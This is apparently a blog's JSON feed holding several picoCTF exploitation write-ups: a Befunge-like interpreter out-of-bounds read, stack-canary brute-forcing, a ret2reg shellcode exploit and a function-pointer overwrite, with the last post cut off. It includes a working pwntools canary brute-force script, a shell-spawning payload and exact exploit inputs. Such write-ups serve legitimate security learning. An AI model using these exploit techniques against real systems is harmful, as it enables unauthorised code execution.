[{"content":"Challenge overview \u0026ldquo;time to do some homework!\u0026rdquo;\nAt first glance, homework looks like a 64-bit executable, but we can\u0026rsquo;t tell much about it.\nAfter using checksec, sadly, PIE is enabled and so is NX.\nWe have a main function (picture above) and a step function. The step function uses and then modifies some variables declared/located in the .bss, so it would be good to see what they look like before execution starts.\nChar board[1100] is at offset 0x5260 from the first read-only section of the binary, int sn at 0x50A0, int stack[104] at 0x50C0, rows at 0x56AC, cols at 0x56B0, diry at 0x56B4, dirx a bit further at 0x5078.\nAs we can see, most of them begin as 0, except the cols and rows (same values as in main) and the dirx starting as 0x1.\nAlso, the flag is stored in the stack, so we might find a way to leak it.\nThe step function is a bit more complicated, with a switch for a lot of operands for the char at board[22 * pcy + pcx]. For each one, sn is checked against some conditions, and `__assert_fail()\u0026rsquo; is used.\nAfter reading the function\u0026rsquo;s documentation, what it does is it aborts the program if the assertion is false, and all of these assertions are either checking sn \u0026gt;= to 1, 2 or 3, or stack[sn-1] \u0026lt;= rows \u0026amp;\u0026amp; stack[sn-2] \u0026lt;= cols.\nThen, most of them redirect to LABEL_76:\nThis relocates pcx (our x position in board, inside step) and our pcy (y position in board inside step).\ndirx and diry seem like regular matrix directions, with values from [-1, 0, 1].\nThen, for each iteration, it falls through to LABEL76, and for normal characters it just seems to iterate through board[], until it finds a special operand.\nHere is everything it does, simplified for a better understanding:\n\u0026#39;!\u0026#39;: if(sn \u0026lt;= 0) abort stack[sn - 1] = 1, if it was 0 stack[sn - 1] = 0, otherwise \u0026#39;$\u0026#39;: if(sn \u0026lt;= 0) abort --sn \u0026#39;%\u0026#39;: if(sn \u0026lt;= 1) abort stack[sn-2] %= stack[sn - 1] --sn \u0026#39;*\u0026#39;: if(sn \u0026lt;= 1) abort stack[sn-2] *= stack[sn-1] --sn \u0026#39;+\u0026#39;: if(sn \u0026lt;= 1) abort stack[sn-2] += stack[sn-1] --sn \u0026#39;,\u0026#39;: if(sn \u0026lt;= 0) abort putchar(stack[--sn]) #print a char at stack[--sn] \u0026#39;-\u0026#39;: if(sn \u0026lt;= 1) abort stack[sn-2] -= stack[sn-1] --sn \u0026#39;.\u0026#39;: if(sn \u0026lt;= 0) abort printf(%d, stack[--sn]) #this might help us leak stack! \u0026#39;/\u0026#39;: if(sn \u0026lt;= 1) abort stack[sn-2] /= stack[sn-1] --sn \u0026#39;:\u0026#39;: if(sn \u0026lt;=0 ) abort stack[sn] = stack[sn-1] ++sn \u0026#39;\\\\\u0026#39;: if(sn\u0026lt;=1) abort swap(stack[sn-1], stack[sn-2]) #xor swap \u0026#39;`\u0026#39;: if(sn\u0026lt;=1) abort stack[sn-2] = stack[sn-2] \u0026gt; stack[sn-1] \u0026#39;g\u0026#39;: if(sn\u0026lt;=1) abort if( 0 \u0026lt;= stack[n-1] \u0026lt;= rows \u0026amp;\u0026amp; 0 \u0026lt;= stack[n-2] \u0026lt;= cols) #bounds check stack[sn-2] = board[22 * stack[sn-1] + stack[sn-2]] #stack[sn-2] = board[stack[sn-1]][stack[sn-2]] --sn \u0026#39;p\u0026#39;: if(sn\u0026lt;=2) abort if( 0 \u0026lt;= stack[n-1] \u0026lt;= rows \u0026amp;\u0026amp; 0 \u0026lt;= stack[n-2] \u0026lt;= cols) #bounds check board[22 * stack[sn-1] + stack[sn-2]] = stack[sn-3] #board[stack[sn-1]][stack[sn-2]] = stack[sn-3] sn-=3 \u0026#39;\u0026lt;\u0026#39;: dirx = -1 diry = 0 #go to the previous element in board array \u0026#39;\u0026gt;\u0026#39;: dirx = 1 diry = 0 #go to the next element in board array \u0026#39;^\u0026#39;: dirx = 0 diry = -1 #move up a row in board \u0026#39;v\u0026#39;: dirx = 0 diry = 1 #move down a row in board \u0026#39;_\u0026#39;: if(sn\u0026lt;=0) abort if(stack[--sn] dirx= - 1 else dirx = 1 diry = 0 \u0026#39;|\u0026#39;: if(sn\u0026lt;=0) abort if(stack[--sn] diry = -1 else diry = 1 dirx = 0 \u0026#39;@\u0026#39;: return 0; default: if(board[22* pcy + pcx] == \u0026#39;0\u0026#39;]) if(sn\u0026gt;99) abort v1 = sn++ stack[v1] = 0 LABEL_76: #update pcx and pcy based on dirx and diry return 1 Every case except the @ which returns 0, will step into LABEL_76.\nQuite a long function isn\u0026rsquo;t it?\nWe can conclude that pcx and pcy probably stand for player/position current x and y.\nThe case that seems the most interesting is the . since it does printf(%d, stack[--sn]. In .bss we have:\nstack[0]: 0x50C0\nflag: 0x56E0\nAnd so the offset between them is 0x620, or 1568 in decimal. Since int_size is 4 bytes, that means by accessing stack[392] we should reach flag\u0026rsquo;s .bss location.\nThe only cases that raise our sn are the : and default case, and they both only raise sn by 1.\nAnd, the 22*i byte of board is always 0.\nTo be fair, this solution seems too good to be true, but let\u0026rsquo;s explore it anyways.\nMy first Idea With the input 0::::::::::::::::::::::::::[and so on] we managed to raise sn so that stack[sn] overwrites some data.\nI also tried a loop \u0026gt;\u0026gt;:::\u0026lt;\u0026lt; that theoretically should\u0026rsquo;be incremented sn forever.\nBut this only gets us to sn = 110.\nFor some reason after sn reaches 110 it wont enter the : anymore whatsoever, but it won\u0026rsquo;t abort either, weird. So maybe that\u0026rsquo;s not the way to go with this\u0026hellip;\nAt this point, I was starting to doubt modifying sn was the way to go, so I tried to find other any confirmation of this idea. The only two other writeups I found both overwrote the rows variable, which was directly after board on the .bss.\nBut I\u0026rsquo;m going to have a little faith in my idea so I will try to see if I can manage something before giving up.\nWhat I missed was that the stack was actually a stack (what a surprise, right?) and sn was the stack pointer.\nUnderstanding step and stack So almost every action was a pop() or a push(). It was very well explained in this writeup like this:\n0: push 0 to the top of the stack (also asserts if full) $: discard stack[top] !: logical NOT of top of stack (stack[top] = !stack[top]) `: sets stack[top-1] to result of stack[top] \u0026lt; stack[top-1] (does not pop anything, which is kinda weird) %: pops top 2 elements and pushes stack[top-1] % stack[top] /: pops top 2 elements and pushes stack[top-1] / stack[top] *: pops top 2 elements and pushes stack[top-1] * stack[top] +: pops top 2 elements and pushes stack[top-1] + stack[top] -: pops top 2 elements and pushes stack[top-1] - stack[top] ,: pops and prints stack[top] as ascii character (putchar) .: pops and prints stack[top] as 32-bit number (printf(\u0026#34;%d\u0026#34;)) :: duplicate stack[top] (NO BOUNDS CHECK!!!) \\: swap top 2 elements using XOR pc controls: \u0026lt;: set pc direction to left \u0026gt;: set pc direction to right ^: set pc direction to up v: set pc direction to down _: horizontal branch (pc goes right if stack[top]==0, left otherwise), pops stack[top] |: vertical branch (pc goes down if stack[top]==0, up otherwse), pops stack[top] @: stop program g: pushes board[stack[top]][stack[top-1]] onto stack top, pops top 2 elements p: sets board[stack[top]][stack[top-1]] = (char) stack[top-2], popping off all 3 elements Well, makes a lot more sense now!\nAnd look at this:\nWhen we reach sn = 109, after stack[sn] goes into the data immediately after stack which is board, so we overwrite board and fill the values with 0!!\nAnd we deleted our loop \u0026gt;\u0026gt;::::\u0026lt;\u0026lt; ourselves! Well, ideally, we would want to overwrite them with : instead of 0, right? and since we just duplicate the current top stack element and push it in the stack, if we manage to set the first character on the stack to be :, we might be able to avoid this!\nAdding numbers to stack First, to start summing/multiplicating numbers, we need to get two 1 values on the stack. The input we should give:\n0: push 0 on the stack\n!: pop; push 1;\n:: push 1;\nNow we have a stack that looks like [1, 1].\n+: pop a, pop b; push(a+b)\nNow stack looks like [2].\nSince in ASCII, : is 58, if we add a bunch of 2s, we can get stack[top] to become 58\nI\u0026rsquo;m thinking we duplicate the 2 using : and then multiply the first six ones, we reach 64. Then we can just decrement 2 another three times, and we get 58.\n:: push 2; stack = [2, 2]\n+: pop a,b; push a+b; stack = [4]\n:: push 4; stack = [4, 4]\n:: push 4; stack = [4, 4, 4]\n*: pop a,b; push a*b; stack = [4, 16]\n*: pop a,b; push a*b; stack = [64]\nNow, since the - pushes stack[top-1] - stack[top], we need to push a 6 above the 64 in the stack.\n0: push 0; stack = [64, 0]\n!: pop; push 1; stack = [64, 1]\n:: push 1; stack = [64, 1, 1]\n+: pop a, b; push a+b; stack = [64, 2]\n:: push 2; stack = [64, 2, 2]\n:: push 2; stack = [64, 2, 2, 2]\n+: pop a, b; push a+b; stack = [64, 2, 4]\n+: pop a, b; push a+b; stack = [64, 6]\n-: pop a, b; push b-a; stack = [58]\n,: pop a, putchar(a); stack = []\n@: return 0;\nSo our payload would be 0!:+:+::**0!:+::++-,@. And it worked!\nA sad realisation This is the situation I wanted to reach. In the second board drawing, the direction gets set back by the \u0026lt;, and we repeat the : padding until we reach board[0] again. Theoretically, this should raise sn to ~277. Still not 392 but closer\u0026hellip;\n(Note from the future - I didn\u0026rsquo;t understand how board was being parsed yet - but more on that later - without using ^ or v we cannot switch rows)\nSince can never really tell when we reached the correct sn, what if we just print the stack top in every loop? We know what the flag is supposed to look like, so we can find it between the printed garbage values.\nWell, in a \u0026gt;.:\u0026lt; sequence what happens is:\nstack = [...data1, data2, data3, data4] memory = [...data1, data2, data3, data4, data 5, data 6...] \u0026#39;.\u0026#39;: stack = [...data1, data2, data3] print data4 memory = [...data1, data2, data3, data4, data 5, data 6...] \u0026#39;:\u0026#39;: stack = [...data1, data2, data3, data3] memory = [...data1, data2, data3, data3, data 5, data 6...] \u0026#39;.\u0026#39;: stack = [...data1, data2, data3] print data3 memory = [...data1, data2, data3, data3, data 5, data 6...] Well. Looks like we just overwrite the data, and we can only print data that we already overwrote. Would\u0026rsquo;ve been nice to realise this earlier.\nThe solution Since the most interesting/out-of-the-ordinary cases were\ng: pushes board[stack[top]][stack[top-1]] onto stack top, pops top 2 elements p: sets board[stack[top]][stack[top-1]] = (char) stack[top-2], popping off all 3 elements it\u0026rsquo;s most likely that we are going to have to use them to solve the chall.\nHowever, we have face a bounds check, that requires:\n0\u0026lt;=stack[top]\u0026lt;=rows\n0\u0026lt;=stack[top-1]\u0026lt;=cols.\nThat means, the command executes even for stack[top] == rows and stack[top-1] == cols; That means we can edit the data at board[50][22]. But board is indexed from starting from 0, so that means that we have an extra row at our disposal! (50*22 + 22 is 1122).\nIn .bss, the data immediately after board, aka the data we can and are going to overflow, is rows, cols, dirx and pcx.\nThe useful ones are rows and cols, because they can completely break us out of that bound check. So first, let\u0026rsquo;s get stack[top] to 50. Then we can figure out the value we need to insert starting after board[1100].\nSince modifying rows would mean having to flip through a couple of different rows to output the flag, I\u0026rsquo;d rather opt for modifying cols.\nThat means 4 bytes after rows (board[1100]), is cols, So we should set stack[top-1] to 4.\nThe sequence that gets us 50 is 0!::+:++::+*, so that would be stack[top].\nSo what should we change cols to? The best idea would be to use\ng: pushes board[stack[top]][stack[top-1]] onto stack top, pops top 2 elements\nWhere board[stack[top]*22] + stack[top-1]] would be the first character of the flag, then use , to print it, and do the same for the next n characters of the flag, probably around 45.\nLet\u0026rsquo;s calculate the offset from board to flag:\nboard: 0x5260\nflag: 0x56E0\nSo 0x480 = 1152. And that\u0026rsquo;s the beginning of flag, so we would reach around 1197. That would mean we would need cols should be at around 100.\nAlright, so to set cols to somewhere a bit more than 100 then.\nThat is 0!::+:++::** for 125 (better safe than sorry).\nAfter fiddling a lot with inputs, it looks like the way step reads our board is a lot like the snake game, so we need to redirect it and change directions every time we switch rows. And all of them should be close in column-lengths.\nAs a fun fact, apparently this is based on Befunge, and I quote, a two-dimensional esoteric programming language invented in 1993 by Chris Pressey with the goal of being as difficult to compile as possible.\nWe need two rows of input:\n0!::+:++::** 0!:+ v #push 125, push 2, go to next row\n*+::++:+::!0 +: \u0026lt; #change movement to left, 2-\u0026gt;4, push 50\nWhen we go down one row, we need to change the direction of reading, so the second row is read from right to left.\nSo now stack looks like [125, 4, 50]. Let\u0026rsquo;s check if it works, and we modify rows.\nIt does push 125 to the stack, but the other values? ({ is 125)\nAlright, getting somewhere!\nLooking great!! Finally, we get confirmation we modified cols.\nNow let\u0026rsquo;s move onto the next row. p popped all of our values, so we need to push new ones.\ng: pushes board[stack[top]][stack[top-1]] onto stack top, pops top 2 elements\nstack[top] needs to be 50, and stack[top-1] needs to iterate from 125 to 52.\nThe Loop We need to print from board[1100 + 52] for the first character to board[1100 + 125] to the last. So logically we would need a loop for that. So, let\u0026rsquo;s create one using this language. If we just pad a line to the right and to left with the same direction character, \u0026gt; or \u0026lt;, it will keep going back to the other side of the row.\n\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;execute\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\nor\n\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;execute\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\nor something like\n\u0026gt; code here ......... v ^ other code here.... \u0026lt; This is my idea of solving this; But we would need to push a 50 to board[0][0] to have easy access to it later. The last thing we push in the stack in line 2 is a 50, so we might as well do it there.\nsince p: sets board[stack[top]][stack[top-1]] = (char) stack[top-2], popping off all 3, and we want to keep the 50 in the stack to overwrite cols, we can do the following:\n:: [125, 4, 50, 50]\n00: [125, 4, 50, 50, 0, 0]\np: [125, 4, 50] and board[0][0] = 50\nAnd after this we can resume overwriting cols.\np: board[50][4] = 125\nNow, we can start using g to fetch 50 in our loop. For simplicity, lets start with the first col 51.\n00: [0, 0]\ng : board[0][0]=50\nNow we can officially start the loop.\n0!+: [51] increment current stack top\n:: [51, 51]\n00: [51, 51, 0, 0]\ng: [51, 51, 50], board[50][51] -\u0026gt; stack top\ng: [51, char]\n,: [51] print(char)\nAnd now go back to increment.\nAnd I think I did it!\nNow testing remotely, fingers crossed\u0026hellip;\nIt actually worked! Yay! This is definitely my longest writeup yet, but I hope I covered everything on this, since it can definitely be very overwhelming for beginners.\nAs always, the rest of the code can be found on my GitHub here.\n","permalink":"https://irinasusca.github.io/writeup-blog/posts/homework-writeup/","summary":"\u003ch2 id=\"challenge-overview\"\u003eChallenge overview\u003c/h2\u003e\n\u003cp\u003e\u0026ldquo;time to do some \u003cstrong\u003e\u003ca href=\"https://play.picoctf.org/practice/challenge/217\"\u003ehomework\u003c/a\u003e\u003c/strong\u003e!\u0026rdquo;\u003c/p\u003e\n\u003cp\u003eAt first glance, \u003cstrong\u003ehomework\u003c/strong\u003e looks like a 64-bit executable, but we can\u0026rsquo;t tell much about it.\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"challenge-screenshot\" loading=\"lazy\" src=\"/writeup-blog/posts/homework-writeup/pic1.png#center\"\u003e\u003c/p\u003e\n\u003cp\u003eAfter using checksec, sadly, \u003ccode\u003ePIE\u003c/code\u003e is enabled and so is \u003ccode\u003eNX\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"challenge-screenshot\" loading=\"lazy\" src=\"/writeup-blog/posts/homework-writeup/pic2.png#center\"\u003e\u003c/p\u003e\n\u003cp\u003eWe have a \u003ccode\u003emain\u003c/code\u003e function \u003cem\u003e(picture above)\u003c/em\u003e and a \u003ccode\u003estep\u003c/code\u003e function.\nThe \u003ccode\u003estep\u003c/code\u003e function uses and then modifies some variables declared/located in the \u003ccode\u003e.bss\u003c/code\u003e, so it would be good to see what they look like before execution starts.\u003c/p\u003e","title":"Pico Homework Writeup"},{"content":"Challenge overview Do you think you can bypass the protection and get the flag? It looks like Dr. Oswal added a stack canary to this program to protect against buffer overflows.\nAt first glance, the vuln looks like a 32-bit executable, probably with a buffer overflow vulnerability.\nWe are first prompted to create a canary.txt file, and the binary runs after that.\nAnalyzing the binary, first, the read_canary() function is called, and then we go into vuln.\nThere\u0026rsquo;s also a win function included in the binary, so we don\u0026rsquo;t have to worry about getting a shell ourselves.\nSo, firstly, the read_canary() reads four bytes from canary.txt.\nAfter renaming some of the variables from vuln, it starts looking like this:\nWe see the call to sscanf, and looking at the C documentation for it, what it does is it takes the input from v as an integer, and stores it in \u0026amp;nbytes.\nThen, read(0, buf, nbytes) will read from the standard input (file descriptor 0), and write nbytesbytes from input intobuf`.\nAfter that, the binary checks if the canary has been modified.\nIdentifying the vulnerabilities Time for debugging with gef! I set a bp on the while(v_size \u0026lt;= 63) just to check if we got anything wrong.\nLooks like our buffer overflow worked!\nFor the first input being 123 and the content being an \u0026lsquo;A\u0026rsquo; buffer overflow, it sure does look like it worked!\nThe only issue is that the canary is also overwritten, so we need to take care of that now.\nThe global canary is saved in the .bss, and the stack canary is compared to that, to determine a whether stack smashing took place or not.\nThe canary example I chose is 0xebad3600, you can use zsh to write it into canary.txt like so:\necho -en \u0026#39;\\x00\\x36\\xad\\xeb\u0026#39; \u0026gt; canary.txt Here it\u0026rsquo;s comparing the global canary to our stack canary which is currently overwritten by a bunch of \u0026lsquo;A\u0026rsquo;s.\nSince the canary is static, taken from a canary.txt file, we might be able to simply bruteforce it, byte by byte.\nThe offset from the beginning of our input buffer to the canary is 0x40, so 64 in decimal.\nThe Canary Considering the challenge hint is Maybe there\u0026rsquo;s a smart way to brute-force the canary?, I\u0026rsquo;m guessing there\u0026rsquo;s more to it than just bruteforcing it. The global canary is in a rw zone, so maybe we can overwrite it?\nBut since it\u0026rsquo;s 4 bytes, and most likely the last byte is null, we could just bruteforce it. There are 16,777,216 possible combinations with 3 bytes.\nBut if we test byte-by-byte, we can lower this number monumentally. So, I opted for creating a canary_bruteforce() function to help us find the correct canary.\nI\u0026rsquo;m not familiar with bruteforcing canaries so I looked online to see if I can find a script to help with this, but most of them didn\u0026rsquo;t work.\nIn the end, the most helpful source was this writeup. I made my own canary_bruteforce() with similar logic, but I always opt for using and sending bytes rather than strings.\ndef canary_bruteforce(): canary= b\u0026#34;\u0026#34; for i in range(1, 5): for c in range(256): p=elf.process() p.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) p.sendline(str(64+i)) p.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) payload = b\u0026#34;A\u0026#34;*64 + canary + bytes([c]) p.sendline(payload) result = p.recvall(timeout=0.2) if b\u0026#34;Stack\u0026#34; not in result: canary += bytes([c]) log.info(f\u0026#34;[+] Found: {canary.hex()}\u0026#34;) p.close() break p.close() return canary Testing it locally, we leak our canary and get the flag!\nAll that\u0026rsquo;s left to do is connect remotely and see if we can extract the actual flag. The first time I tried, it didn\u0026rsquo;t work, so I ended up having to increase the timeout from 0.2 to 1, and instead of p.recvuntil, p.sendline I used p.sendlineafter, and that worked!\nAnd that’s it! The rest of the code can be found on my GitHub here.\n","permalink":"https://irinasusca.github.io/writeup-blog/posts/bufferoverflow3-writeup/","summary":"\u003ch2 id=\"challenge-overview\"\u003eChallenge overview\u003c/h2\u003e\n\u003cp\u003eDo you think you can bypass the protection and get the flag? It looks like Dr. Oswal added a stack canary to \u003cstrong\u003e\u003ca href=\"https://play.picoctf.org/practice/challenge/306\"\u003ethis program\u003c/a\u003e\u003c/strong\u003e to protect against buffer overflows.\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"challenge-screenshot\" loading=\"lazy\" src=\"/writeup-blog/posts/bufferoverflow3-writeup/pic1.png#center\"\u003e\u003c/p\u003e\n\u003cp\u003eAt first glance, the \u003cstrong\u003evuln\u003c/strong\u003e looks like a 32-bit executable, probably with a buffer overflow vulnerability.\u003c/p\u003e\n\u003cp\u003eWe are first prompted to create a canary.txt file, and the binary runs after that.\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"challenge-screenshot\" loading=\"lazy\" src=\"/writeup-blog/posts/bufferoverflow3-writeup/pic2.png#center\"\u003e\u003c/p\u003e\n\u003cp\u003eAnalyzing the binary, first, the \u003ccode\u003eread_canary()\u003c/code\u003e function is called, and then we go into \u003ccode\u003evuln\u003c/code\u003e.\u003c/p\u003e","title":"Pico Buffer Overflow 3 Writeup"},{"content":"Challenge overview What\u0026rsquo;s ROP? Can you exploit the following program to get the flag?\nAt first glance, the vuln looks like a 32-bit executable with a buffer overflow vulnerability.\nIdentifying the vulnerabilities Analyzing the binary, it doesn\u0026rsquo;t look like anything special, just an ordinary buffer overflow.\nWe don\u0026rsquo;t seem to have a /bin/sh in memory so this probably means we have to execute a ret2reg.\nThat means we need to make our own bin/sh and point to it, and since the vuln returns the gets, that means eax will hold the gets return value. And the return value of gets is a pointer to the input value!\nThis is because eax/rax usually holds the current function\u0026rsquo;s return value.\nWould you look at that, no NX! So we can execute the code right on the stack! Since we have a large enough overflow (28 bytes), we don\u0026rsquo;t need to worry getting a shell.\nThat means we can just get a jmp eax gadget, and write our shellcraft.sh() at the start the input buffer.\nThe Exploit Well, looks like we need to write the shellcode ourselves, shellcraft.sh() was too large after all\u0026hellip;\nI tried a bunch of shellcode that kept getting me segmentation faults, that I won\u0026rsquo;t include, and I tried fitting it all in our buffer before the jmp eax gadget, and I managed to get all the registers required right (for execve, ebx needs to be a pointer to /bin/sh, and ecx and edx need to be 0)\nAfter I set the address after eip, eip+4, to be a null-terminated /bin/sh, I noticed esp would become that value.\nSo, I tried doing\nmov ebx, esp xor ecx, ecx xor edx, edx mov al, 0x0b int 0x80 And my mistake was most likely that I messed with the stack frame, since execve kept returning error 0xffffff74 = -140 = ERFAULT.\nBut then I thought, if after the jmp eax the value at eip+4 goes into esp, why don\u0026rsquo;t we write the shellcode in eip+4, then just jmp esp to said shellcode?\nThat way, we can just use shellcraft.sh(), since we have unlimited space.\nSince jmp esp is just 2 bytes, we pad with 26 more nops to its left.\npayload = b\u0026#39;\\x90\u0026#39;*26 payload += asm(\u0026#39;jmp esp\u0026#39;) payload += jmp_eax #this will become esp after we execute jmp eax. newshell = asm(shellcraft.sh()) payload += newshell And it works!\nThe rest of the code can be found on my GitHub here.\n","permalink":"https://irinasusca.github.io/writeup-blog/posts/ropfu-writeup/","summary":"\u003ch2 id=\"challenge-overview\"\u003eChallenge overview\u003c/h2\u003e\n\u003cp\u003eWhat\u0026rsquo;s ROP? Can you exploit the following \u003cstrong\u003e\u003ca href=\"https://play.picoctf.org/practice/challenge/292\"\u003eprogram\u003c/a\u003e\u003c/strong\u003e to get the flag?\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"challenge-screenshot\" loading=\"lazy\" src=\"/writeup-blog/posts/ropfu-writeup/pic1.png#center\"\u003e\u003c/p\u003e\n\u003cp\u003eAt first glance, the \u003cstrong\u003evuln\u003c/strong\u003e looks like a 32-bit executable with a buffer overflow vulnerability.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"identifying-the-vulnerabilities\"\u003eIdentifying the vulnerabilities\u003c/h2\u003e\n\u003cp\u003eAnalyzing the binary, it doesn\u0026rsquo;t look like anything special, just an ordinary buffer overflow.\u003c/p\u003e\n\u003cp\u003eWe don\u0026rsquo;t seem to have a \u003ccode\u003e/bin/sh\u003c/code\u003e in memory so this probably means we have to execute a ret2reg.\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"challenge-screenshot\" loading=\"lazy\" src=\"/writeup-blog/posts/ropfu-writeup/pic3.png#center\"\u003e\u003c/p\u003e\n\u003cp\u003eThat means we need to make our own \u003ccode\u003ebin/sh\u003c/code\u003e and point to it, and since the \u003ccode\u003evuln\u003c/code\u003e \u003cem\u003ereturns\u003c/em\u003e the \u003ccode\u003egets\u003c/code\u003e, that means \u003ccode\u003eeax\u003c/code\u003e will hold the \u003ccode\u003egets\u003c/code\u003e return value. And the return value of \u003ccode\u003egets\u003c/code\u003e is a pointer to the input value!\u003c/p\u003e","title":"Pico Ropfu Writeup"},{"content":"Challenge overview Story telling class 2/2 Additional details will be available after launching your challenge instance.\nUpon a quick check, we see that the challenge is a 32-bit binary, and that we can trigger a SEGFAULT. It might be a buffer overflow, but the challenge doesn\u0026rsquo;t necessarily hint that, so let\u0026rsquo;s inspect it further.\nAlso NX is enabled, so let\u0026rsquo;s keep that in mind.\nThe first input string is not susceptible to a buffer overflow, but something interesting happens on the second scanf. We read two %d (ints), but only one destination for them (\u0026amp;number1).\nWe also have another couple of functions, hard_checker, easy_checker and calculate_story_score.\nThe check in easy_checker:\nif ( calculate_story_score(input, input_size) != 1337 ) return printf(\u0026#34;You\u0026#39;ve failed this class.\u0026#34;); The check in hard_checker:\nif ( calculate_story_score(input, input_size) != 13371337 ) return printf(\u0026#34;You\u0026#39;ve failed this class.\u0026#34;); And the calculate_story_score they both use:\nNow, inspecting with gef, let\u0026rsquo;s see where all of our values end up. For input='inputexample', nr1=7 (so it satisfies the first check) and nr2='testing'), it looks like input is being placed on the stack while the second number is getting placed on the heap.\nThe functions we stepped into were hard_checker and then calculate_story_score, so no easy_checker.\nWhat calculate_story_score does is it sums all of the ASCII characters inside our input string.\nFor our inputexample string, the output should be\nsum = 105 + 110 + 112 + 117 + 116 + 101 + 120 + 97 + 109 + 112 + 108 + 101 So, 1308. Setting a breakpoint on the return of calculate_story_score, we can see the value right there on the stack! (0x51c = 1308)\nAnd here it is, checking if it\u0026rsquo;s equal to 13371337:\nIdentifying the vulnerability So, we need to find a string that has the sum of its ASCII characters equal to 13371337. But that\u0026rsquo;s quite a big number, isn\u0026rsquo;t it? And we only have 127 bytes available.\nChars go from 0-255, so our best case scenario would be 127*255, so 32385. Not even close to 13371337 is it?\nWe could either find a way to go into easy_checker instead, or find another way to raise our sum.\nSince the challenge hint was Don\u0026rsquo;t be so negative, I\u0026rsquo;m going to assume there\u0026rsquo;s a way to integer overflow or something else to allow us to reach that number.\nOne thing we haven\u0026rsquo;t handled yet is the two numbers. What bothers me are these lines of code:\nif ( numbers \u0026lt;= 9 ) fun[number1] += v3; After trying with two numbers, (78 and 78), we can see they\u0026rsquo;re still placed in the stack and the heap respectively (I thought the second one might\u0026rsquo;ve ended up on the heap because I gave it too large a value, but it wasn\u0026rsquo;t the case).\nDebugging Detour Before actually figuring out how to solve this challenge, I wasted a surprising amount of time due to a small mistake, which is that I kept using a string value for the second %d argument. Since scanf(\u0026quot;%d\u0026quot;) interprets 4-byte integers, my string \u0026quot;testing\u0026quot; became some random hex bytes that I misinterpreted as something hardcoded.\nBecause of that, I spent a lot of time trying to find ways to overwrite the ASCII sum, manipulate the comparison instruction, overwrite .rodata, or patch return addresses, so a couple of hours in gef and a lot of SEGFAULTS. Turns out the specific hex value was literally just the second integer, which I had broken it myself by feeding it a string.\nAnd also the challenge had nothing to do with the heap either.\nSo maybe the lesson to be learned is to be a lot more careful with \u0026ldquo;testing\u0026rdquo; input values.\nThe exploit Let\u0026rsquo;s take a look at the assembly code for this if:\nmov eax, [ebp+number1] #eax = number1 mov ecx, ds:(fun - 804C000h)[ebx+eax*4] #ecx = fun[number1] mov edx, [ebp+var_90] # edx = number2 mov eax, [ebp+number1] # eax = numbers add edx, ecx # edx += ecx mov ds:(fun - 804C000h)[ebx+eax*4], edx # fun[number1] = edx Or more simply put,\nfun_table[number1 * 4] += number2; Here we can see number2 getting loaded into edx. And ebx + 0x80 is just the address of fun.\nHere is fun in .data, located at 0804C080.\nAnother interesting thing was how the hard_checker function was called:\nv0 = check; return v0((int)input, input_size); Where check holds the address of hard_checker: 0x804c040 \u0026lt;check\u0026gt;: 0x08049436\nAnd guess what, check is, just like fun, located in the .rodata!\nSince the condition in hard_checker was sum == 13371337, which is impossibe to reach, and we have a similar function called easy_checker that presents us with a much more attainable sum == 1337, we can already guess we are supposed to somehow modify the address in check from hard_checker to easy_checker.\nSince we can choose a negative [numbers] index, we can modify data out of bounds to control the value of check.\nDouble checking with vmmap, the area is rw, so we can modify values!\n0x0804c000 0x0804d000 0x00003000 rw- /home/kali/Downloads/vuln\nOkay, so\nfun - check is 0x804C080 - 0x804C040,\nwhich is 0x40.\nSince we need to modify fun[-0x40], that meansnumber1*4 should be -0x40 = -64. So we already figured out number1 = -16.\nTaking care of the sum, our inputexample was already close to 1337. 1337 - 1308 = 29, so instead of e (101 ASCII) I added two A\u0026rsquo;s (65+65 = 101 +29).\nNow, to figure out number2, we just need to calculate the offset between hard_checker and easy_checker.\nhard_checker : 0x08049436\neasy_checker : 0x80492FC\nSo out offset is -0x13A, -314 in hex.\nAnd we\u0026rsquo;re done!\nThe rest of the code can be found on my GitHub here.\n","permalink":"https://irinasusca.github.io/writeup-blog/posts/functionoverwrite-writeup/","summary":"\u003ch2 id=\"challenge-overview\"\u003eChallenge overview\u003c/h2\u003e\n\u003cp\u003eStory telling class 2/2\nAdditional details will be available after launching your \u003cstrong\u003e\u003ca href=\"https://play.picoctf.org/practice/challenge/272\"\u003echallenge instance\u003c/a\u003e\u003c/strong\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"challenge-screenshot\" loading=\"lazy\" src=\"/writeup-blog/posts/functionoverwrite-writeup/pic1.png#center\"\u003e\u003c/p\u003e\n\u003cp\u003eUpon a quick check, we see that the challenge is a \u003ccode\u003e32-bit\u003c/code\u003e binary, and that we can trigger a \u003ccode\u003eSEGFAULT\u003c/code\u003e. It might be a buffer overflow, but the challenge doesn\u0026rsquo;t necessarily hint that, so let\u0026rsquo;s inspect it further.\u003c/p\u003e\n\u003cp\u003eAlso NX is enabled, so let\u0026rsquo;s keep that in mind.\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"challenge-screenshot\" loading=\"lazy\" src=\"/writeup-blog/posts/functionoverwrite-writeup/pic2.png#center\"\u003e\u003c/p\u003e\n\u003cp\u003eThe first input string is not susceptible to a buffer overflow, but something interesting happens on the second \u003ccode\u003escanf\u003c/code\u003e. We read two \u003ccode\u003e%d\u003c/code\u003e (ints), but only one destination for them (\u003ccode\u003e\u0026amp;number1\u003c/code\u003e).\u003c/p\u003e","title":"Pico Function Overwrite Writeup"},{"content":"Challenge overview Undefined behaviours are fun. It looks like Dr. Oswal allowed buffer overflows again. Analyse this program to identify how you can get to the flag.\nAt first glance, the vuln looks like a 32-bit executable with a buffer overflow vulnerability.\nAnalyzing the binary, we come across some interesting funtions, UnderConstruction and 